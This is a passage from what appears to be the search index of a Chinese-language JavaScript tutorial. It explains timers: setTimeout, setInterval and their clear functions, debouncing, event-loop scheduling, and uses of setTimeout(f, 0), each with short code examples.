\u901a\u4fe1\u7684\u6700\u5c0f\u95f4\u9694\u65f6\u95f4\u3002\u5982\u679c\u5728\u95f4\u9694\u65f6\u95f4\u5185\uff0c\u53d1\u751f\u65b0\u7684 keydown \u4e8b\u4ef6\uff0c\u5219\u4e0d\u89e6\u53d1 Ajax \u901a\u4fe1\uff0c\u5e76\u4e14\u91cd\u65b0\u5f00\u59cb\u8ba1\u65f6\u3002\u5982\u679c\u8fc7\u4e86\u6307\u5b9a\u65f6\u95f4\uff0c\u6ca1\u6709\u53d1\u751f\u65b0\u7684 keydown \u4e8b\u4ef6\uff0c\u518d\u5c06\u6570\u636e\u53d1\u9001\u51fa\u53bb\u3002 \u8fd9\u79cd\u505a\u6cd5\u53eb\u505a debounce\uff08\u9632\u6296\u52a8\uff09\u3002\u5047\u5b9a\u4e24\u6b21 Ajax \u901a\u4fe1\u7684\u95f4\u9694\u4e0d\u5f97\u5c0f\u4e8e2500\u6beb\u79d2\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u6539\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ( 'textarea' ). on ( 'keydown' , debounce ( ajaxAction , 2500 )); function debounce ( fn , delay ){ var timer = null ; // \u58f0\u660e\u8ba1\u65f6\u5668 return function () { var context = this ; var args = arguments ; clearTimeout ( timer ); timer = setTimeout ( function () { fn . apply ( context , args ); }, delay ); }; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u8981\u57282500\u6beb\u79d2\u4e4b\u5185\uff0c\u7528\u6237\u518d\u6b21\u51fb\u952e\uff0c\u5c31\u4f1a\u53d6\u6d88\u4e0a\u4e00\u6b21\u7684\u5b9a\u65f6\u5668\uff0c\u7136\u540e\u518d\u65b0\u5efa\u4e00\u4e2a\u5b9a\u65f6\u5668\u3002\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86\u56de\u8c03\u51fd\u6570\u4e4b\u95f4\u7684\u8c03\u7528\u95f4\u9694\uff0c\u81f3\u5c11\u662f2500\u6beb\u79d2\u3002 \u8fd0\u884c\u673a\u5236 \u00b6 setTimeout \u548c setInterval \u7684\u8fd0\u884c\u673a\u5236\uff0c\u662f\u5c06\u6307\u5b9a\u7684\u4ee3\u7801\u79fb\u51fa\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\uff0c\u7b49\u5230\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\uff0c\u518d\u68c0\u67e5\u662f\u5426\u5230\u4e86\u6307\u5b9a\u65f6\u95f4\u3002\u5982\u679c\u5230\u4e86\uff0c\u5c31\u6267\u884c\u5bf9\u5e94\u7684\u4ee3\u7801\uff1b\u5982\u679c\u4e0d\u5230\uff0c\u5c31\u7ee7\u7eed\u7b49\u5f85\u3002 \u8fd9\u610f\u5473\u7740\uff0c setTimeout \u548c setInterval \u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff0c\u5fc5\u987b\u7b49\u5230\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u7684\u6240\u6709\u540c\u6b65\u4efb\u52a1\u90fd\u6267\u884c\u5b8c\uff0c\u624d\u4f1a\u5f00\u59cb\u6267\u884c\u3002\u7531\u4e8e\u524d\u9762\u7684\u4efb\u52a1\u5230\u5e95\u9700\u8981\u591a\u5c11\u65f6\u95f4\u6267\u884c\u5b8c\uff0c\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u4fdd\u8bc1\uff0c setTimeout \u548c setInterval \u6307\u5b9a\u7684\u4efb\u52a1\uff0c\u4e00\u5b9a\u4f1a\u6309\u7167\u9884\u5b9a\u65f6\u95f4\u6267\u884c\u3002 1 2 setTimeout ( someTask , 100 ); veryLongTask (); \u4e0a\u9762\u4ee3\u7801\u7684 setTimeout \uff0c\u6307\u5b9a100\u6beb\u79d2\u4ee5\u540e\u8fd0\u884c\u4e00\u4e2a\u4efb\u52a1\u3002\u4f46\u662f\uff0c\u5982\u679c\u540e\u9762\u7684 veryLongTask \u51fd\u6570\uff08\u540c\u6b65\u4efb\u52a1\uff09\u8fd0\u884c\u65f6\u95f4\u975e\u5e38\u957f\uff0c\u8fc7\u4e86100\u6beb\u79d2\u8fd8\u65e0\u6cd5\u7ed3\u675f\uff0c\u90a3\u4e48\u88ab\u63a8\u8fdf\u8fd0\u884c\u7684 someTask \u5c31\u53ea\u6709\u7b49\u7740\uff0c\u7b49\u5230 veryLongTask \u8fd0\u884c\u7ed3\u675f\uff0c\u624d\u8f6e\u5230\u5b83\u6267\u884c\u3002 \u518d\u770b\u4e00\u4e2a setInterval \u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 setInterval ( function () { console . log ( 2 ); }, 1000 ); sleep ( 3000 ); function sleep ( ms ) { var start = Date . now (); while (( Date . now () - start ) < ms ) { } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setInterval \u8981\u6c42\u6bcf\u96941000\u6beb\u79d2\uff0c\u5c31\u8f93\u51fa\u4e00\u4e2a2\u3002\u4f46\u662f\uff0c\u7d27\u63a5\u7740\u7684 sleep \u8bed\u53e5\u9700\u89813000\u6beb\u79d2\u624d\u80fd\u5b8c\u6210\uff0c\u90a3\u4e48 setInterval \u5c31\u5fc5\u987b\u63a8\u8fdf\u52303000\u6beb\u79d2\u4e4b\u540e\u624d\u5f00\u59cb\u751f\u6548\u3002\u6ce8\u610f\uff0c\u751f\u6548\u540e setInterval \u4e0d\u4f1a\u4ea7\u751f\u7d2f\u79ef\u6548\u5e94\uff0c\u5373\u4e0d\u4f1a\u4e00\u4e0b\u5b50\u8f93\u51fa\u4e09\u4e2a2\uff0c\u800c\u662f\u53ea\u4f1a\u8f93\u51fa\u4e00\u4e2a2\u3002 setTimeout(f, 0) \u00b6 \u542b\u4e49 \u00b6 setTimeout \u7684\u4f5c\u7528\u662f\u5c06\u4ee3\u7801\u63a8\u8fdf\u5230\u6307\u5b9a\u65f6\u95f4\u6267\u884c\uff0c\u5982\u679c\u6307\u5b9a\u65f6\u95f4\u4e3a 0 \uff0c\u5373 setTimeout(f, 0) \uff0c\u90a3\u4e48\u4f1a\u7acb\u523b\u6267\u884c\u5417\uff1f \u7b54\u6848\u662f\u4e0d\u4f1a\u3002\u56e0\u4e3a\u4e0a\u4e00\u8282\u8bf4\u8fc7\uff0c\u5fc5\u987b\u8981\u7b49\u5230\u5f53\u524d\u811a\u672c\u7684\u540c\u6b65\u4efb\u52a1\uff0c\u5168\u90e8\u5904\u7406\u5b8c\u4ee5\u540e\uff0c\u624d\u4f1a\u6267\u884c setTimeout \u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570 f \u3002\u4e5f\u5c31\u662f\u8bf4\uff0c setTimeout(f, 0) \u4f1a\u5728\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\u4e00\u5f00\u59cb\u5c31\u6267\u884c\u3002 1 2 3 4 5 6 setTimeout ( function () { console . log ( 1 ); }, 0 ); console . log ( 2 ); // 2 // 1 \u4e0a\u9762\u4ee3\u7801\u5148\u8f93\u51fa 2 \uff0c\u518d\u8f93\u51fa 1 \u3002\u56e0\u4e3a 2 \u662f\u540c\u6b65\u4efb\u52a1\uff0c\u5728\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u6267\u884c\uff0c\u800c 1 \u662f\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\u6267\u884c\u3002 \u603b\u4e4b\uff0c setTimeout(f, 0) \u8fd9\u79cd\u5199\u6cd5\u7684\u76ee\u7684\u662f\uff0c\u5c3d\u53ef\u80fd\u65e9\u5730\u6267\u884c f \uff0c\u4f46\u662f\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u7acb\u523b\u5c31\u6267\u884c f \u3002 \u5b9e\u9645\u4e0a\uff0c setTimeout(f, 0) \u4e0d\u4f1a\u771f\u7684\u57280\u6beb\u79d2\u4e4b\u540e\u8fd0\u884c\uff0c\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u6709\u4e0d\u540c\u7684\u5b9e\u73b0\u3002\u4ee5 Edge \u6d4f\u89c8\u5668\u4e3a\u4f8b\uff0c\u4f1a\u7b49\u52304\u6beb\u79d2\u4e4b\u540e\u8fd0\u884c\u3002\u5982\u679c\u7535\u8111\u6b63\u5728\u4f7f\u7528\u7535\u6c60\u4f9b\u7535\uff0c\u4f1a\u7b49\u523016\u6beb\u79d2\u4e4b\u540e\u8fd0\u884c\uff1b\u5982\u679c\u7f51\u9875\u4e0d\u5728\u5f53\u524d Tab \u9875\uff0c\u4f1a\u63a8\u8fdf\u52301000\u6beb\u79d2\uff081\u79d2\uff09\u4e4b\u540e\u8fd0\u884c\u3002\u8fd9\u6837\u662f\u4e3a\u4e86\u8282\u7701\u7cfb\u7edf\u8d44\u6e90\u3002 \u5e94\u7528 \u00b6 setTimeout(f, 0) \u6709\u51e0\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u7528\u9014\u3002\u5b83\u7684\u4e00\u5927\u5e94\u7528\u662f\uff0c\u53ef\u4ee5\u8c03\u6574\u4e8b\u4ef6\u7684\u53d1\u751f\u987a\u5e8f\u3002\u6bd4\u5982\uff0c\u7f51\u9875\u5f00\u53d1\u4e2d\uff0c\u67d0\u4e2a\u4e8b\u4ef6\u5148\u53d1\u751f\u5728\u5b50\u5143\u7d20\uff0c\u7136\u540e\u5192\u6ce1\u5230\u7236\u5143\u7d20\uff0c\u5373\u5b50\u5143\u7d20\u7684\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\uff0c\u4f1a\u65e9\u4e8e\u7236\u5143\u7d20\u7684\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\u89e6\u53d1\u3002\u5982\u679c\uff0c\u60f3\u8ba9\u7236\u5143\u7d20\u7684\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\u5148\u53d1\u751f\uff0c\u5c31\u8981\u7528\u5230 setTimeout(f, 0) \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"button\" id=\"myButton\" value=\"click\"> var input = document . getElementById ( 'myButton' ); input . onclick = function A () { setTimeout ( function B () { input . value += ' input' ; }, 0 ) }; document . body . onclick = function C () { input . value += ' body' }; \u4e0a\u9762\u4ee3\u7801\u5728\u70b9\u51fb\u6309\u94ae\u540e\uff0c\u5148\u89e6\u53d1\u56de\u8c03\u51fd\u6570 A \uff0c\u7136\u540e\u89e6\u53d1\u51fd\u6570 C \u3002\u51fd\u6570 A \u4e2d\uff0c setTimeout \u5c06\u51fd\u6570 B \u63a8\u8fdf\u5230\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\u6267\u884c\uff0c\u8fd9\u6837\u5c31\u8d77\u5230\u4e86\uff0c\u5148\u89e6\u53d1\u7236\u5143\u7d20\u7684\u56de\u8c03\u51fd\u6570 C \u7684\u76ee\u7684\u4e86\u3002 \u53e6\u4e00\u4e2a\u5e94\u7528\u662f\uff0c\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u56de\u8c03\u51fd\u6570\uff0c\u901a\u5e38\u5728\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u52a8\u4f5c\u4e4b\u524d\u89e6\u53d1\u3002\u6bd4\u5982\uff0c\u7528\u6237\u5728\u8f93\u5165\u6846\u8f93\u5165\u6587\u672c\uff0c keypress \u4e8b\u4ef6\u4f1a\u5728\u6d4f\u89c8\u5668\u63a5\u6536\u6587\u672c\u4e4b\u524d\u89e6\u53d1\u3002\u56e0\u6b64\uff0c\u4e0b\u9762\u7684\u56de\u8c03\u51fd\u6570\u662f\u8fbe\u4e0d\u5230\u76ee\u7684\u7684\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"text\" id=\"input-box\"> document . getElementById ( 'input-box' ). onkeypress = function ( event ) { this . value = this . value . toUpperCase (); } \u4e0a\u9762\u4ee3\u7801\u60f3\u5728\u7528\u6237\u6bcf\u6b21\u8f93\u5165\u6587\u672c\u540e\uff0c\u7acb\u5373\u5c06\u5b57\u7b26\u8f6c\u4e3a\u5927\u5199\u3002\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u5b83\u53ea\u80fd\u5c06\u672c\u6b21\u8f93\u5165\u524d\u7684\u5b57\u7b26\u8f6c\u4e3a\u5927\u5199\uff0c\u56e0\u4e3a\u6d4f\u89c8\u5668\u6b64\u65f6\u8fd8\u6ca1\u63a5\u6536\u5230\u65b0\u7684\u6587\u672c\uff0c\u6240\u4ee5 this.value \u53d6\u4e0d\u5230\u6700\u65b0\u8f93\u5165\u7684\u90a3\u4e2a\u5b57\u7b26\u3002\u53ea\u6709\u7528 setTimeout \u6539\u5199\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u624d\u80fd\u53d1\u6325\u4f5c\u7528\u3002 1 2 3 4 5 6 document . getElementById ( 'input-box' ). onkeypress = function () { var self = this ; setTimeout ( function () { self . value = self . value . toUpperCase (); }, 0 ); } \u4e0a\u9762\u4ee3\u7801\u5c06\u4ee3\u7801\u653e\u5165 setTimeout \u4e4b\u4e2d\uff0c\u5c31\u80fd\u4f7f\u5f97\u5b83\u5728\u6d4f\u89c8\u5668\u63a5\u6536\u5230\u6587\u672c\u4e4b\u540e\u89e6\u53d1\u3002 \u7531\u4e8e setTimeout(f, 0) \u5b9e\u9645\u4e0a\u610f\u5473\u7740\uff0c\u5c06\u4efb\u52a1\u653e\u5230\u6d4f\u89c8\u5668\u6700\u65e9\u53ef\u5f97\u7684\u7a7a\u95f2\u65f6\u6bb5\u6267\u884c\uff0c\u6240\u4ee5\u90a3\u4e9b\u8ba1\u7b97\u91cf\u5927\u3001\u8017\u65f6\u957f\u7684\u4efb\u52a1\uff0c\u5e38\u5e38\u4f1a\u88ab\u653e\u5230\u51e0\u4e2a\u5c0f\u90e8\u5206\uff0c\u5206\u522b\u653e\u5230 setTimeout(f, 0) \u91cc\u9762\u6267\u884c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var div = document . getElementsByTagName ( 'div' )[ 0 ]; // \u5199\u6cd5\u4e00 for ( var i = 0xA00000 ; i < 0xFFFFFF ; i ++ ) { div . style . backgroundColor = '#' + i . toString ( 16 ); } // \u5199\u6cd5\u4e8c var timer ; var i = 0x100000 ; function func () { timer = setTimeout ( func , 0 ); div . style . backgroundColor = '#' + i . toString ( 16 ); if ( i ++ == 0xFFFFFF ) clearTimeout ( timer ); } timer = setTimeout ( func , 0 ); \u4e0a\u9762\u4ee3\u7801\u6709\u4e24\u79cd\u5199\u6cd5\uff0c\u90fd\u662f\u6539\u53d8\u4e00\u4e2a\u7f51\u9875\u5143\u7d20\u7684\u80cc\u666f\u8272\u3002\u5199\u6cd5\u4e00\u4f1a\u9020\u6210\u6d4f\u89c8\u5668\u201c\u5835\u585e\u201d\uff0c\u56e0\u4e3a JavaScript \u6267\u884c\u901f\u5ea6\u8fdc\u9ad8\u4e8e DOM\uff0c\u4f1a\u9020\u6210\u5927\u91cf DOM \u64cd\u4f5c\u201c\u5806\u79ef\u201d\uff0c\u800c\u5199\u6cd5\u4e8c\u5c31\u4e0d\u4f1a\uff0c\u8fd9\u5c31\u662f setTimeout(f, 0) \u7684\u597d\u5904\u3002 \u53e6\u4e00\u4e2a\u4f7f\u7528\u8fd9\u79cd\u6280\u5de7\u7684\u4f8b\u5b50\u662f\u4ee3\u7801\u9ad8\u4eae\u7684\u5904\u7406\u3002\u5982\u679c\u4ee3\u7801\u5757\u5f88\u5927\uff0c\u4e00\u6b21\u6027\u5904\u7406\uff0c\u53ef\u80fd\u4f1a\u5bf9\u6027\u80fd\u9020\u6210\u5f88\u5927\u7684\u538b\u529b\uff0c\u90a3\u4e48\u5c06\u5176\u5206\u6210\u4e00\u4e2a\u4e2a\u5c0f\u5757\uff0c\u4e00\u6b21\u5904\u7406\u4e00\u5757\uff0c\u6bd4\u5982\u5199\u6210 setTimeout(highlightNext, 50) \u7684\u6837\u5b50\uff0c\u6027\u80fd\u538b\u529b\u5c31\u4f1a\u51cf\u8f7b\u3002","title":"\u5b9a\u65f6\u5668"},{"location":"async/timer/#_1","text":"JavaScript \u63d0\u4f9b\u5b9a\u65f6\u6267\u884c\u4ee3\u7801\u7684\u529f\u80fd\uff0c\u53eb\u505a\u5b9a\u65f6\u5668\uff08timer\uff09\uff0c\u4e3b\u8981\u7531 setTimeout() \u548c setInterval() \u8fd9\u4e24\u4e2a\u51fd\u6570\u6765\u5b8c\u6210\u3002\u5b83\u4eec\u5411\u4efb\u52a1\u961f\u5217\u6dfb\u52a0\u5b9a\u65f6\u4efb\u52a1\u3002","title":"\u5b9a\u65f6\u5668"},{"location":"async/timer/#settimeout","text":"setTimeout \u51fd\u6570\u7528\u6765\u6307\u5b9a\u67d0\u4e2a\u51fd\u6570\u6216\u67d0\u6bb5\u4ee3\u7801\uff0c\u5728\u591a\u5c11\u6beb\u79d2\u4e4b\u540e\u6267\u884c\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5b9a\u65f6\u5668\u7684\u7f16\u53f7\uff0c\u4ee5\u540e\u53ef\u4ee5\u7528\u6765\u53d6\u6d88\u8fd9\u4e2a\u5b9a\u65f6\u5668\u3002 1 var timerId = setTimeout ( func | code , delay ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setTimeout \u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570 func|code \u662f\u5c06\u8981\u63a8\u8fdf\u6267\u884c\u7684\u51fd\u6570\u540d\u6216\u8005\u4e00\u6bb5\u4ee3\u7801\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570 delay \u662f\u63a8\u8fdf\u6267\u884c\u7684\u6beb\u79d2\u6570\u3002 1 2 3 4 5 6 console . log ( 1 ); setTimeout ( 'console.log(2)' , 1000 ); console . log ( 3 ); // 1 // 3 // 2 \u4e0a\u9762\u4ee3\u7801\u4f1a\u5148\u8f93\u51fa1\u548c3\uff0c\u7136\u540e\u7b49\u5f851000\u6beb\u79d2\u518d\u8f93\u51fa2\u3002\u6ce8\u610f\uff0c console.log(2) \u5fc5\u987b\u4ee5\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\uff0c\u4f5c\u4e3a setTimeout \u7684\u53c2\u6570\u3002 \u5982\u679c\u63a8\u8fdf\u6267\u884c\u7684\u662f\u51fd\u6570\uff0c\u5c31\u76f4\u63a5\u5c06\u51fd\u6570\u540d\uff0c\u4f5c\u4e3a setTimeout \u7684\u53c2\u6570\u3002 1 2 3 4 5 function f () { console . log ( 2 ); } setTimeout ( f , 1000 ); setTimeout \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5982\u679c\u7701\u7565\uff0c\u5219\u9ed8\u8ba4\u4e3a0\u3002 1 2 3 setTimeout ( f ) // \u7b49\u540c\u4e8e setTimeout ( f , 0 ) \u9664\u4e86\u524d\u4e24\u4e2a\u53c2\u6570\uff0c setTimeout \u8fd8\u5141\u8bb8\u66f4\u591a\u7684\u53c2\u6570\u3002\u5b83\u4eec\u5c06\u4f9d\u6b21\u4f20\u5165\u63a8\u8fdf\u6267\u884c\u7684\u51fd\u6570\uff08\u56de\u8c03\u51fd\u6570\uff09\u3002 1 2 3 setTimeout ( function ( a , b ) { console . log ( a + b ); }, 1000 , 1 , 1 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setTimeout \u5171\u67094\u4e2a\u53c2\u6570\u3002\u6700\u540e\u90a3\u4e24\u4e2a\u53c2\u6570\uff0c\u5c06\u57281000\u6beb\u79d2\u4e4b\u540e\u56de\u8c03\u51fd\u6570\u6267\u884c\u65f6\uff0c\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u3002 \u8fd8\u6709\u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\uff0c\u5982\u679c\u56de\u8c03\u51fd\u6570\u662f\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u90a3\u4e48 setTimeout \u4f7f\u5f97\u65b9\u6cd5\u5185\u90e8\u7684 this \u5173\u952e\u5b57\u6307\u5411\u5168\u5c40\u73af\u5883\uff0c\u800c\u4e0d\u662f\u5b9a\u4e49\u65f6\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 var x = 1 ; var obj = { x : 2 , y : function () { console . log ( this . x ); } }; setTimeout ( obj . y , 1000 ) // 1 \u4e0a\u9762\u4ee3\u7801\u8f93\u51fa\u7684\u662f1\uff0c\u800c\u4e0d\u662f2\u3002\u56e0\u4e3a\u5f53 obj.y \u57281000\u6beb\u79d2\u540e\u8fd0\u884c\u65f6\uff0c this \u6240\u6307\u5411\u7684\u5df2\u7ecf\u4e0d\u662f obj \u4e86\uff0c\u800c\u662f\u5168\u5c40\u73af\u5883\u3002 \u4e3a\u4e86\u9632\u6b62\u51fa\u73b0\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u5c06 obj.y \u653e\u5165\u4e00\u4e2a\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var x = 1 ; var obj = { x : 2 , y : function () { console . log ( this . x ); } }; setTimeout ( function () { obj . y (); }, 1000 ); // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.y \u653e\u5728\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u4e4b\u4e2d\uff0c\u8fd9\u4f7f\u5f97 obj.y \u5728 obj \u7684\u4f5c\u7528\u57df\u6267\u884c\uff0c\u800c\u4e0d\u662f\u5728\u5168\u5c40\u4f5c\u7528\u57df\u5185\u6267\u884c\uff0c\u6240\u4ee5\u80fd\u591f\u663e\u793a\u6b63\u786e\u7684\u503c\u3002 \u53e6\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u4f7f\u7528 bind \u65b9\u6cd5\uff0c\u5c06 obj.y \u8fd9\u4e2a\u65b9\u6cd5\u7ed1\u5b9a\u5728 obj \u4e0a\u9762\u3002 1 2 3 4 5 6 7 8 9 10 11 var x = 1 ; var obj = { x : 2 , y : function () { console . log ( this . x ); } }; setTimeout ( obj . y . bind ( obj ), 1000 ) // 2","title":"setTimeout()"},{"location":"async/timer/#setinterval","text":"setInterval \u51fd\u6570\u7684\u7528\u6cd5\u4e0e setTimeout \u5b8c\u5168\u4e00\u81f4\uff0c\u533a\u522b\u4ec5\u4ec5\u5728\u4e8e setInterval \u6307\u5b9a\u67d0\u4e2a\u4efb\u52a1\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u5c31\u6267\u884c\u4e00\u6b21\uff0c\u4e5f\u5c31\u662f\u65e0\u9650\u6b21\u7684\u5b9a\u65f6\u6267\u884c\u3002 1 2 3 4 var i = 1 var timer = setInterval ( function () { console . log ( 2 ); }, 1000 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6bcf\u96941000\u6beb\u79d2\u5c31\u8f93\u51fa\u4e00\u4e2a2\uff0c\u4f1a\u65e0\u9650\u8fd0\u884c\u4e0b\u53bb\uff0c\u76f4\u5230\u5173\u95ed\u5f53\u524d\u7a97\u53e3\u3002 \u4e0e setTimeout \u4e00\u6837\uff0c\u9664\u4e86\u524d\u4e24\u4e2a\u53c2\u6570\uff0c setInterval \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u66f4\u591a\u7684\u53c2\u6570\uff0c\u5b83\u4eec\u4f1a\u4f20\u5165\u56de\u8c03\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u901a\u8fc7 setInterval \u65b9\u6cd5\u5b9e\u73b0\u7f51\u9875\u52a8\u753b\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 var div = document . getElementById ( 'someDiv' ); var opacity = 1 ; var fader = setInterval ( function () { opacity -= 0.1 ; if ( opacity >= 0 ) { div . style . opacity = opacity ; } else { clearInterval ( fader ); } }, 100 ); \u4e0a\u9762\u4ee3\u7801\u6bcf\u9694100\u6beb\u79d2\uff0c\u8bbe\u7f6e\u4e00\u6b21 div \u5143\u7d20\u7684\u900f\u660e\u5ea6\uff0c\u76f4\u81f3\u5176\u5b8c\u5168\u900f\u660e\u4e3a\u6b62\u3002 setInterval \u7684\u4e00\u4e2a\u5e38\u89c1\u7528\u9014\u662f\u5b9e\u73b0\u8f6e\u8be2\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u8f6e\u8be2 URL \u7684 Hash \u503c\u662f\u5426\u53d1\u751f\u53d8\u5316\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 var hash = window . location . hash ; var hashWatcher = setInterval ( function () { if ( window . location . hash != hash ) { updatePage (); } }, 1000 ); setInterval \u6307\u5b9a\u7684\u662f\u201c\u5f00\u59cb\u6267\u884c\u201d\u4e4b\u95f4\u7684\u95f4\u9694\uff0c\u5e76\u4e0d\u8003\u8651\u6bcf\u6b21\u4efb\u52a1\u6267\u884c\u672c\u8eab\u6240\u6d88\u8017\u7684\u65f6\u95f4\u3002\u56e0\u6b64\u5b9e\u9645\u4e0a\uff0c\u4e24\u6b21\u6267\u884c\u4e4b\u95f4\u7684\u95f4\u9694\u4f1a\u5c0f\u4e8e\u6307\u5b9a\u7684\u65f6\u95f4\u3002\u6bd4\u5982\uff0c setInterval \u6307\u5b9a\u6bcf 100ms \u6267\u884c\u4e00\u6b21\uff0c\u6bcf\u6b21\u6267\u884c\u9700\u8981 5ms\uff0c\u90a3\u4e48\u7b2c\u4e00\u6b21\u6267\u884c\u7ed3\u675f\u540e95\u6beb\u79d2\uff0c\u7b2c\u4e8c\u6b21\u6267\u884c\u5c31\u4f1a\u5f00\u59cb\u3002\u5982\u679c\u67d0\u6b21\u6267\u884c\u8017\u65f6\u7279\u522b\u957f\uff0c\u6bd4\u5982\u9700\u8981105\u6beb\u79d2\uff0c\u90a3\u4e48\u5b83\u7ed3\u675f\u540e\uff0c\u4e0b\u4e00\u6b21\u6267\u884c\u5c31\u4f1a\u7acb\u5373\u5f00\u59cb\u3002 \u4e3a\u4e86\u786e\u4fdd\u4e24\u6b21\u6267\u884c\u4e4b\u95f4\u6709\u56fa\u5b9a\u7684\u95f4\u9694\uff0c\u53ef\u4ee5\u4e0d\u7528 setInterval \uff0c\u800c\u662f\u6bcf\u6b21\u6267\u884c\u7ed3\u675f\u540e\uff0c\u4f7f\u7528 setTimeout \u6307\u5b9a\u4e0b\u4e00\u6b21\u6267\u884c\u7684\u5177\u4f53\u65f6\u95f4\u3002 1 2 3 4 5 var i = 1 ; var timer = setTimeout ( function f () { // ... timer = setTimeout ( f , 2000 ); }, 2000 ); \u4e0a\u9762\u4ee3\u7801\u53ef\u4ee5\u786e\u4fdd\uff0c\u4e0b\u4e00\u6b21\u6267\u884c\u603b\u662f\u5728\u672c\u6b21\u6267\u884c\u7ed3\u675f\u4e4b\u540e\u76842000\u6beb\u79d2\u5f00\u59cb\u3002","title":"setInterval()"},{"location":"async/timer/#cleartimeoutclearinterval","text":"setTimeout \u548c setInterval \u51fd\u6570\uff0c\u90fd\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u8ba1\u6570\u5668\u7f16\u53f7\u3002\u5c06\u8be5\u6574\u6570\u4f20\u5165 clearTimeout \u548c clearInterval \u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u53d6\u6d88\u5bf9\u5e94\u7684\u5b9a\u65f6\u5668\u3002 1 2 3 4 5 var id1 = setTimeout ( f , 1000 ); var id2 = setInterval ( f , 1000 ); clearTimeout ( id1 ); clearInterval ( id2 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u56de\u8c03\u51fd\u6570 f \u4e0d\u4f1a\u518d\u6267\u884c\u4e86\uff0c\u56e0\u4e3a\u4e24\u4e2a\u5b9a\u65f6\u5668\u90fd\u88ab\u53d6\u6d88\u4e86\u3002 setTimeout \u548c setInterval \u8fd4\u56de\u7684\u6574\u6570\u503c\u662f\u8fde\u7eed\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u7b2c\u4e8c\u4e2a setTimeout \u65b9\u6cd5\u8fd4\u56de\u7684\u6574\u6570\u503c\uff0c\u5c06\u6bd4\u7b2c\u4e00\u4e2a\u7684\u6574\u6570\u503c\u59271\u3002 1 2 3 4 function f () {} setTimeout ( f , 1000 ) // 10 setTimeout ( f , 1000 ) // 11 setTimeout ( f , 1000 ) // 12 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fde\u7eed\u8c03\u7528\u4e09\u6b21 setTimeout \uff0c\u8fd4\u56de\u503c\u90fd\u6bd4\u4e0a\u4e00\u6b21\u5927\u4e861\u3002 \u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u5199\u4e00\u4e2a\u51fd\u6570\uff0c\u53d6\u6d88\u5f53\u524d\u6240\u6709\u7684 setTimeout \u5b9a\u65f6\u5668\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ( function () { // \u6bcf\u8f6e\u4e8b\u4ef6\u5faa\u73af\u68c0\u67e5\u4e00\u6b21 var gid = setInterval ( clearAllTimeouts , 0 ); function clearAllTimeouts () { var id = setTimeout ( function () {}, 0 ); while ( id > 0 ) { if ( id !== gid ) { clearTimeout ( id ); } id -- ; } } })(); 